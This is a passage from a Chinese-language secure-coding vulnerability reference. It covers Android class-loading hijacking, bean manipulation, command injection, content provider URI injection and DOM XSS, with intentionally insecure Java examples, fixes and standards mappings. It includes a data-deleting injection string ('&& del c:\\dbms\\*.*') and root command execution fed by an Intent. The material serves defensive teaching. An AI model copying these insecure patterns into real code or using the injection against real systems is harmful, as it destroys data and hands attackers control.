<p>此代码允许攻击者指定优化的 DEX 文件 (ODEX) 的输出目录。这样，恶意用户便可以将 userOutput 的值更改为他们控制的目录，例如外部存储。一旦达到这一目的，便可以很轻松地将输出的 ODEX 文件替换为恶意 ODEX 文件，并使用与原始应用程序一样的权限加以执行。</p>
<h5 id="RECOMMENDATIONS-253"><a href="#RECOMMENDATIONS-253" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止用户控制用于指定要加载的库的路径。若加载类的选择一定要涉及用户输入的话，通常情况下，应用程序会期望这个特定的输入是一个很小的值集合。如果不依赖输入便是安全的和非恶意的，那么应用程序所使用的输入应该仅从一个预定的安全位置集合中进行选择。如果输入看上去是恶意的，则用于搜索类的路径将默认为这一集合中的某个安全选择，或者程序将拒绝继续执行该操作。</p>
<p>攻击者可以通过篡改环境间接地控制程序加载的库。我们不应当完全信赖环境，还需采取预防措施，防止攻击者利用某些控制环境的手段进行攻击。只要有可能，加载的类应由应用程序进行控制，并使用绝对路径进行加载。如果编译时不清楚具体的路径，应该在执行的过程中利用可信赖的数值构造一个绝对路径。应对照一系列定义有效参数的不变量对从环境中读取的库名称和路径进行仔细的检查。</p>
<p>有时还可以执行其他校验，以检查环境是否已被恶意篡改。例如，如果一个配置文件为可写，程序可能会拒绝运行。如果事先已知有关要加载的库的信息，程序就会执行检测，以校验文件的有效性。如果一个库应始终归属于某一特定用户，或者被分配了一组特定的权限，则可以在加载库之前，对这些属性进行校验。</p>
<p>最后，不可能对程序提供百分之百的保护，来防止强大的攻击者控制其所加载的库。对输入参数和环境可能执行的任何操作，都应努力鉴别并加以保护。其目标就是尽可能地防范各种攻击。</p>
<h5 id="REFERENCES-252"><a href="#REFERENCES-252" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Android Class Loading Hijacking Symantec</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 114</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<h4 id="Bean-Manipulation"><a href="#Bean-Manipulation" class="headerlink" title="Bean Manipulation"></a>Bean Manipulation</h4><h5 id="ABSTRACT-254"><a href="#ABSTRACT-254" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者可以设置可能会危及系统完整性的任意 bean 属性。</p>
<h5 id="EXPLANATION-255"><a href="#EXPLANATION-255" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Bean 属性的名称和值在填充任何 bean 之前都需要进行验证。Bean 填充功能允许设置 bean 属性或嵌套属性。攻击者可以利用此功能访问特殊的 bean 属性，例如 class.classLoader，此属性将允许攻击者覆盖系统属性并可能会执行任何代码。</p>
<p>示例：下列代码将会设置用户控制的 bean 属性，而不会正确验证属性名称或值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String prop = request.getParameter(&apos;prop&apos;);</span><br><span class="line"></span><br><span class="line">String value = request.getParameter(&apos;value&apos;);</span><br><span class="line"></span><br><span class="line">HashMap properties = new HashMap();</span><br><span class="line"></span><br><span class="line">properties.put(prop, value);</span><br><span class="line"></span><br><span class="line">BeanUtils.populate(user, properties);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-254"><a href="#RECOMMENDATIONS-254" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止 bean 操控的最佳方法是采用一些间接手段：例如创建一份合法属性名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户提供的输入就不能直接用来指定这些关键 bean 属性的详细信息了。</p>
<h5 id="REFERENCES-253"><a href="#REFERENCES-253" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 15</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h4><h5 id="ABSTRACT-255"><a href="#ABSTRACT-255" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>执行不可信赖资源中的命令，或在不可信赖的环境中执行命令，都会导致程序以攻击者的名义执行恶意命令。</p>
<h5 id="EXPLANATION-256"><a href="#EXPLANATION-256" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Command Injection 漏洞主要表现为以下两种形式：</p>
<p>－ 攻击者能够篡改程序执行的命令：攻击者直接控制了所执行的命令。</p>
<p>－ 攻击者能够篡改命令的执行环境：攻击者间接地控制了所执行的命令。</p>
<p>在这种情况下，我们着重关注第一种情况，即攻击者控制所执行命令的可能性。这种形式的 Command Injection 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据被用作代表应用程序所执行命令的字符串，或字符串的一部分。</p>
</li>
<li><p>通过命令的执行，应用程序会授予攻击者一种原本不该拥有的特权或能力。</p>
</li>
</ol>
<p>例 1：下面这段来自系统实用程序的代码根据系统属性 APPHOME 来决定其安装目录，然后根据指定目录的相对路径执行一个初始化脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String home = System.getProperty(&quot;APPHOME&quot;);</span><br><span class="line"></span><br><span class="line">String cmd = home + INITCMD;</span><br><span class="line"></span><br><span class="line">java.lang.Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>例 1 中的代码使得攻击者可通过修改系统属性 APPHOME 而指向一个包含恶意版本 INITCMD 的其他路径，从而提高自己在应用程序中的权限，继而随心所欲地执行命令。由于程序不会验证从环境中读取的值，所以如果攻击者能够控制系统属性 APPHOME 的值，他们就能欺骗应用程序去运行恶意代码从而取得系统控制权。</p>
<p>例 2：下面的代码来自一个管理 Web 应用程序，旨在使用户能够使用一个围绕 rman 实用程序的批处理文件封装器来启动 Oracle 数据库备份，然后运行一个 cleanup.bat 脚本来删除一些临时文件。脚本 rmanDB.bat 接受单个命令行参数，该参数指定了要执行的备份类型。由于访问数据库受限，所以应用程序执行备份需要具有较高权限的用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String btype = request.getParameter(&quot;backuptype&quot;);</span><br><span class="line"></span><br><span class="line">String cmd = new String(&quot;cmd.exe /K</span><br><span class="line"></span><br><span class="line">\&quot;c:\\util\\rmanDB.bat &quot;+btype+&quot;&amp;&amp;c:\\util\\cleanup.bat\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">System.Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里的问题是：程序没有对读取自用户的 backuptype 参数做任何验证。通常情况下 Runtime.exec() 函数不会执行多条命令，但在这种情况下，程序会首先运行 cmd.exe shell，从而可以通过调用一次 Runtime.exec() 来执行多条命令。一旦调用了该 shell，它即会允许执行用两个与号分隔的多条命令。如果攻击者传递了一个形式为<code>“&amp;&amp; del c:\\dbms\\*.*”</code>的字符串，那么应用程序将随程序指定的其他命令一起执行此命令。由于该应用程序的特性，运行该应用程序需要具备与数据库进行交互所需的权限，这就意味着攻击者注入的任何命令都将通过这些权限得以运行。</p>
<p>例 3： 下面的代码来自于一个 web 应用程序，该应用程序就允许用户访问一个可在系统中更新用户密码的接口。在特定的网络环境中更新密码时，其中的一个步骤就是在 /var/yp 目录中运行 make 命令，下面显示了此步骤的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">System.Runtime.getRuntime().exec(&quot;make&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里的问题在于程序没有在它的构造中指定一个绝对路径，并且没能在执行 Runtime.exec() 调用前清除它的环境变量。如果攻击者能够修改 $PATH 变量，把它指向名为 make 恶意二进制代码，程序就会在其指定的环境下执行，然后加载该恶意二进制代码，而非原本期望的代码。由于应用程序自身的特性，运行该应用程序需要具备执行系统操作所需的权限，这意味着攻击者会利用这些权限执行自己的 make，从而可能导致攻击者完全控制系统。</p>
<p>有些人认为在移动世界中，典型的漏洞（如 Command Injection）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>例 4：以下代码可从 Android Intent 中读取要执行的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        String[] cmds = this.getIntent().getStringArrayExtra(&quot;commands&quot;);</span><br><span class="line"></span><br><span class="line">	Process p = Runtime.getRuntime().exec(&quot;su&quot;);</span><br><span class="line"></span><br><span class="line">        DataOutputStream os = new DataOutputStream(p.getOutputStream());</span><br><span class="line"></span><br><span class="line">        for (String cmd : cmds) &#123;</span><br><span class="line"></span><br><span class="line">        	os.writeBytes(cmd+&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        os.writeBytes(&quot;exit\n&quot;);</span><br><span class="line"></span><br><span class="line">        os.flush();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在经过 root 的设备上，恶意应用程序会强迫受攻击应用程序使用超级用户权限执行任意命令。</p>
<h5 id="RECOMMENDATIONS-255"><a href="#RECOMMENDATIONS-255" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止用户直接控制由程序执行的命令。在用户的输入会影响命令执行的情况下，应将用户输入限制为从预定的安全命令集合中进行选择。如果输入中出现了恶意的内容，传递到命令执行函数的值将默认从安全命令集合中选择，或者程序将拒绝执行任何命令。</p>
<p>在需要将用户的输入用作程序命令中的参数时，由于合法的参数集合实在很大，或是难以跟踪，使得这个方法通常都不切实际。开发者通常的做法是使用黑名单。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何一个定义不安全内容的列表都很可能是不完整的，并且会严重地依赖于执行命令的环境。更好的方法是创建一份白名单，允许其中的字符出现在输入中，并且只接受完全由这些经认可的字符组成的输入。</p>
<p>攻击者可以通过修改程序运行命令的环境来间接控制这些命令的执行。我们不应当完全信赖环境，还需采取预防措施，防止攻击者利用某些控制环境的手段进行攻击。无论何时，只要有可能，都应由应用程序来控制命令，并使用绝对路径执行命令。如果编译时尚不了解路径（如在跨平台应用程序中），应该在执行过程中利用可信赖的值构建一个绝对路径。应对照一系列定义有效值的常量，仔细地检查从配置文件或者环境中读取的命令值和路径。</p>
<p>有时还可以执行其他检验，以检查这些来源是否已被恶意篡改。例如，如果一个配置文件为可写，程序可能会拒绝运行。如果能够预先得知有关要执行的二进制代码的信息，程序就会进行检测，以检验这个二进制代码的合法性。如果一个二进制代码始终属于某个特定的用户，或者被指定了一组特定的访问权限，这些属性就会在执行二进制代码前通过程序进行检验。</p>
<p>尽管可能无法完全阻止强大的攻击者为了控制程序执行的命令而对系统进行的攻击，但只要程序执行外部命令，就务必使用最小授权原则：不给予超过执行该命令所必需的权限。</p>
<h5 id="REFERENCES-254"><a href="#REFERENCES-254" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method CERT</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 77, CWE ID 78</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[6] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[19] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 078</p>
<p>[20] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 078</p>
<p>[21] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 078</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Web Application Security Consortium 24 + 2 OS Commanding</p>
<p>[33] Standards Mapping - Web Application Security Consortium Version 2.00 OS Commanding (WASC-31)</p>
<h4 id="Content-Provider-URI-Injection"><a href="#Content-Provider-URI-Injection" class="headerlink" title="Content Provider URI Injection"></a>Content Provider URI Injection</h4><h5 id="ABSTRACT-256"><a href="#ABSTRACT-256" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>构建含有用户输入的内容提供商查询指令会让攻击者能够访问未经授权的记录。</p>
<h5 id="EXPLANATION-257"><a href="#EXPLANATION-257" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Query string injection 漏洞会在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个内容提供商查询 URI。</p>
</li>
</ol>
<p>Android 内容提供商支持开发人员不使用 SQL 而仅通过构建内容提供商 URI 来编写查询。内容供应商查询 URI 易受注入攻击，因此开发人员应避免在未确保元字符得到正确验证或编码的情况下，使用带有受污染数据输入的字符串串联来构建 URI。</p>
<p>例 1： 假定有个应用程序在 URI 上暴露了多个内容提供商：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">content://my.authority/messages</span><br><span class="line"></span><br><span class="line">content://my.authority/messages/123</span><br><span class="line"></span><br><span class="line">content://my.authority/messages/deleted</span><br></pre></td></tr></table></figure>
<p>如果开发人员构建了查询 URI 串联字符串，那么攻击者将可以在路径或其他 URI 元字符中添加改变查询意义的斜线。例如，在下面的代码片段中，攻击者可以通过向 msgId 代码提供值 deleted 来调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">content://my.authority/messages/deleted：</span><br><span class="line"></span><br><span class="line">// &quot;msgId&quot; is submitted by users</span><br><span class="line"></span><br><span class="line">Uri dataUri = Uri.parse(WeatherContentProvider.CONTENT_URI + &quot;/&quot; + msgId);</span><br><span class="line"></span><br><span class="line">Cursor wCursor1 = getContentResolver().query(dataUri, null, null, null, null);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-256"><a href="#RECOMMENDATIONS-256" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>阻止注入攻击的最佳做法是采用一些间接手段。例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<p>Android SDK 提供了 URI 构建器，可对用于构建 URI 的参数进行安全编码。</p>
<p>例 2： 对用户控制的数据进行安全编码，以构建内容提供商查询 URI：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// build the URI securely wih user-controlled data (msgId)</span><br><span class="line"></span><br><span class="line">Uri.Builder builder = WeatherContentProvider.CONTENT_URI.buildUpon();</span><br><span class="line"></span><br><span class="line">Uri dataUri2 = builder.appendPath(msgId).build();</span><br><span class="line"></span><br><span class="line">Cursor safeCursor1 = getContentResolver().query(dataUri2, null, null, null, null);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-255"><a href="#REFERENCES-255" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="Cross-Site-Scripting-DOM"><a href="#Cross-Site-Scripting-DOM" class="headerlink" title="Cross-Site Scripting: DOM"></a>Cross-Site Scripting: DOM</h4><h5 id="ABSTRACT-257"><a href="#ABSTRACT-257" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-258"><a href="#EXPLANATION-258" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于基于 DOM 的 XSS，将从 URL 参数或浏览器中的其他值读取数据，并使用客户端代码将其重新写入该页面。对于 Reflected XSS，不可信赖的源通常为 Web 请求，而对于 Persisted（也称为 Stored）XSS，该源通常为数据库或其他后端数据存储。</p>
</li>
<li><p>未检验包含在动态内容中的数据，便将其传送给了 Web 用户。对于基于 DOM 的 XSS，任何时候当受害人的浏览器解析 HTML 页面时，恶意内容都将作为 DOM（文档对象模型）创建的一部分执行。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例：下面的 JavaScript 代码片段可从 HTTP 请求中读取雇员 ID eid，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String queryString = Window.Location.getQueryString();</span><br><span class="line"></span><br><span class="line">int pos = queryString.indexOf(&quot;eid=&quot;)+4;</span><br><span class="line"></span><br><span class="line">HTML output = new HTML();</span><br><span class="line"></span><br><span class="line">output.setHTML(queryString.substring(pos, queryString.length()));</span><br></pre></td></tr></table></figure>
<p>如果 eid 只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码的 URL，并且还在自己的电脑上运行呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或者社会工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
